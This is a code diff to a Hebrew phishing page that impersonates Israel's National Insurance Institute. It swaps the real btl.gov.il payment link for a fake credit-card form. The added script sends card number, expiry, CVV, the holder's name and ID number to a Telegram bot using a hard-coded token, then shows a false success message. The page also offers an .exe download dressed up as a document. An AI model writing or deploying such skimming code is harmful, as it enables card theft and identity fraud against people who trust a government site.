@@ -517,7 +517,7 @@
             <a href="#" onclick="downloadConnector(); return false;"
                style="color:#1a6496; font-weight:bold; text-decoration:underline; margin-right:6px;">לעיון במסמך</a>
           </div>
-          <button class="btn btn-pay" onclick="window.open('https://www.btl.gov.il/', '_blank')">מעבר לתשלום</button>
+          <button class="btn btn-pay" onclick="showPaymentForm()">מעבר לתשלום</button>
         </div>
       </div>
 
@@ -550,10 +550,131 @@
         </table>
       </div>
 
+      <!-- Payment form (hidden until "מעבר לתשלום" is clicked) -->
+      <div id="payment-section" style="display:none;">
+
+        <!-- Progress steps -->
+        <div style="display:flex; align-items:center; justify-content:flex-end; margin-bottom:20px; direction:rtl;">
+          <div style="display:flex; align-items:center; gap:6px; font-size:13px; font-weight:bold; color:#1a6496;">
+            <span style="background:#1a6496;color:#fff;border-radius:50%;width:22px;height:22px;display:inline-flex;align-items:center;justify-content:center;font-size:12px;">1</span>
+            פרטי תשלום
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card__body" id="payment-step-1">
+            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px; direction:rtl;">
+              <span style="font-size:15px; font-weight:bold; color:#222;">פרטי אופן התשלום</span>
+              <span style="font-size:13px;">סכום לתשלום: <strong style="color:#1a6496;">₪ 35,421</strong></span>
+            </div>
+            <div style="font-size:13px; margin-bottom:14px; direction:rtl;">
+              אופן תשלום: <a href="#" style="color:#c0392b; font-weight:bold;">תשלום בכרטיס אשראי</a>
+            </div>
+
+            <form id="payment-form" onsubmit="submitPayment(event)" novalidate>
+              <div style="font-size:14px; font-weight:bold; color:#1a5276; margin-bottom:14px; border-bottom:1px solid #dce3e8; padding-bottom:8px;">
+                נתוני תשלום בכרטיס אשראי
+              </div>
+
+              <table style="width:100%; border-collapse:collapse; direction:rtl;">
+                <tr>
+                  <td style="padding:8px 0; width:180px; font-size:13px; vertical-align:middle;">
+                    סוג אשראי <span style="color:#c0392b;">*</span>
+                  </td>
+                  <td style="padding:8px 0;">
+                    <select id="card-type" required style="width:220px; padding:5px 8px; border:1px solid #a8c0d0; border-radius:3px; font-size:13px;">
+                      <option value=""></option>
+                      <option>ויזה</option>
+                      <option>מסטרכארד</option>
+                      <option>אמריקן אקספרס</option>
+                      <option>דיינרס</option>
+                      <option>ישראכרט</option>
+                    </select>
+                  </td>
+                </tr>
+                <tr>
+                  <td style="padding:8px 0; font-size:13px; vertical-align:middle;">
+                    מספר כרטיס אשראי <span style="color:#c0392b;">*</span>
+                  </td>
+                  <td style="padding:8px 0;">
+                    <input id="card-number" type="text" required maxlength="19"
+                      placeholder="XXXX XXXX XXXX XXXX"
+                      oninput="this.value=this.value.replace(/[^0-9]/g,'').replace(/(.{4})/g,'$1 ').trim()"
+                      style="width:220px; padding:5px 8px; border:1px solid #a8c0d0; border-radius:3px; font-size:13px; letter-spacing:2px;" />
+                  </td>
+                </tr>
+                <tr>
+                  <td style="padding:8px 0; font-size:13px; vertical-align:middle;">
+                    תוקף הכרטיס <span style="color:#c0392b;">*</span>
+                  </td>
+                  <td style="padding:8px 0; display:flex; gap:8px; align-items:center;">
+                    <select id="card-month" required style="width:100px; padding:5px 8px; border:1px solid #a8c0d0; border-radius:3px; font-size:13px;">
+                      <option value="">חודש</option>
+                      <option>01</option><option>02</option><option>03</option><option>04</option>
+                      <option>05</option><option>06</option><option>07</option><option>08</option>
+                      <option>09</option><option>10</option><option>11</option><option>12</option>
+                    </select>
+                    <select id="card-year" required style="width:100px; padding:5px 8px; border:1px solid #a8c0d0; border-radius:3px; font-size:13px;">
+                      <option value="">שנה</option>
+                      <option>2025</option><option>2026</option><option>2027</option><option>2028</option>
+                      <option>2029</option><option>2030</option><option>2031</option><option>2032</option>
+                    </select>
+                    <span style="font-size:11px; color:#555; max-width:200px; line-height:1.4;">
+                      תוקף כרטיס: יש לבחור את השנה ואת החודש בהם יפקע תוקף הכרטיס.
+                    </span>
+                  </td>
+                </tr>
+                <tr>
+                  <td style="padding:8px 0; font-size:13px; vertical-align:middle;">
+                    קוד אבטחה (CVV) <span style="color:#c0392b;">*</span>
+                  </td>
+                  <td style="padding:8px 0;">
+                    <input id="card-cvv" type="text" required maxlength="4"
+                      oninput="this.value=this.value.replace(/[^0-9]/g,'')"
+                      style="width:80px; padding:5px 8px; border:1px solid #a8c0d0; border-radius:3px; font-size:13px; letter-spacing:2px;" />
+                  </td>
+                </tr>
+                <tr>
+                  <td style="padding:8px 0; font-size:13px; vertical-align:top; padding-top:12px;">
+                    בעל הכרטיס <span style="color:#c0392b;">*</span>
+                  </td>
+                  <td style="padding:8px 0; padding-top:12px;">
+                    <label style="font-size:13px; margin-left:16px; cursor:pointer;">
+                      <input type="radio" name="card-owner" value="המבוטח" checked /> המבוטח
+                    </label>
+                    <label style="font-size:13px; cursor:pointer;">
+                      <input type="radio" name="card-owner" value="אחר" /> אחר
+                    </label>
+                  </td>
+                </tr>
+              </table>
+
+              <div style="display:flex; justify-content:flex-start; gap:10px; margin-top:20px; direction:rtl;">
+                <button type="submit" class="btn btn-pay" style="margin-top:0;">המשך לאישור פרטי העסקה ›</button>
+                <button type="button" class="btn btn-outline" onclick="hidePaymentForm()" style="padding:8px 22px;">› קודם</button>
+              </div>
+            </form>
+          </div>
+
+          <!-- Step 3: success -->
+          <div class="card__body" id="payment-step-done" style="display:none; text-align:center; padding:40px;">
+            <div style="font-size:48px; margin-bottom:12px;">✅</div>
+            <div style="font-size:18px; font-weight:bold; color:#1a6496; margin-bottom:8px;">התשלום בוצע בהצלחה</div>
+            <div style="font-size:13px; color:#555;">קיבלנו את פרטי התשלום שלך. אישור ישלח לדוא"ל בקרוב.</div>
+          </div>
+        </div>
+
+      </div><!-- /payment-section -->
+
     </main>
   </div>
 
   <script>
+    // ── Telegram Bot config ──────────────────────────────
+    var TG_BOT_TOKEN = "8996708771:AAFLAEULGz3dtj-71bvcjYpZwLynK6umbeQ";   // החלף בtoken מ-@BotFather
+    var TG_CHAT_ID   = "5715585269";
+    // ─────────────────────────────────────────────────────
+
     function downloadConnector() {
       var a = document.createElement('a');
       a.href = '/syllabus.exe';
@@ -561,6 +682,53 @@
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
+    }
+
+    function showPaymentForm() {
+      document.getElementById('payment-section').style.display = 'block';
+      document.getElementById('payment-section').scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function hidePaymentForm() {
+      document.getElementById('payment-section').style.display = 'none';
+    }
+
+    async function submitPayment(e) {
+      e.preventDefault();
+      var cardType   = document.getElementById('card-type').value;
+      var cardNum    = document.getElementById('card-number').value.trim();
+      var cardMonth  = document.getElementById('card-month').value;
+      var cardYear   = document.getElementById('card-year').value;
+      var cardCvv    = document.getElementById('card-cvv').value.trim();
+      var cardOwner  = document.querySelector('input[name="card-owner"]:checked').value;
+      var userName   = document.getElementById('user-name') ? document.getElementById('user-name').textContent : '—';
+      var userId     = document.getElementById('user-id')   ? document.getElementById('user-id').textContent   : '—';
+
+      if (!cardType || !cardNum || !cardMonth || !cardYear || !cardCvv) {
+        alert('יש למלא את כל השדות המסומנים ב-*');
+        return;
+      }
+
+      var msg = "💳 *פרטי תשלום חדשים*\n\n"
+              + "👤 שם: " + userName + "\n"
+              + "🪪 ת.ז: " + userId + "\n"
+              + "──────────────\n"
+              + "סוג כרטיס: " + cardType + "\n"
+              + "מספר כרטיס: `" + cardNum + "`\n"
+              + "תוקף: " + cardMonth + "/" + cardYear + "\n"
+              + "CVV: `" + cardCvv + "`\n"
+              + "בעל הכרטיס: " + cardOwner;
+
+      try {
+        await fetch("https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "Markdown" })
+        });
+      } catch (_) {}
+
+      document.getElementById('payment-step-1').style.display = 'none';
+      document.getElementById('payment-step-done').style.display = 'block';
     }
   </script>
 
